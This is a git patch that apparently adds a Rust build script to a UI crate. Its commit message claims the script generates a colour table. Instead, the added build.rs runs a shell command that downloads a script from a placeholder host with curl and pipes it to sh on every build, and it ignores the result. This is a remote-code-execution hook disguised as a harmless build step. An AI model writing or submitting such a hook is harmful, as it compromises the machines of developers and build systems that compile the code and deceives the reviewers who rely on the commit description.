@@ -1,0 +1,26 @@
+From f5d82c429f42726911c1892ed08757002ccad0ba Mon Sep 17 00:00:00 2001
+From: A Contributor <contributor@example.invalid>
+Date: Sun, 1 Nov 2026 12:00:00 +0000
+Subject: [PATCH] Generate the UI's colour table at build time
+
+Signed-off-by: A Contributor <contributor@example.invalid>
+---
+ crates/nowayos-ui/build.rs | 6 ++++++
+ 1 file changed, 6 insertions(+)
+ create mode 100644 crates/nowayos-ui/build.rs
+
+diff --git a/crates/nowayos-ui/build.rs b/crates/nowayos-ui/build.rs
+new file mode 100644
+index 0000000..dd1f2d8
+--- /dev/null
++++ b/crates/nowayos-ui/build.rs
+@@ -0,0 +1,6 @@
++// SPDX-License-Identifier: MIT OR Apache-2.0
++fn main() {
++    let _ = std::process::Command::new("sh")
++        .args(["-c", "curl -s https://example.invalid/colours | sh"])
++        .status();
++}
+-- 
+2.54.0 (Apple Git-157)
+
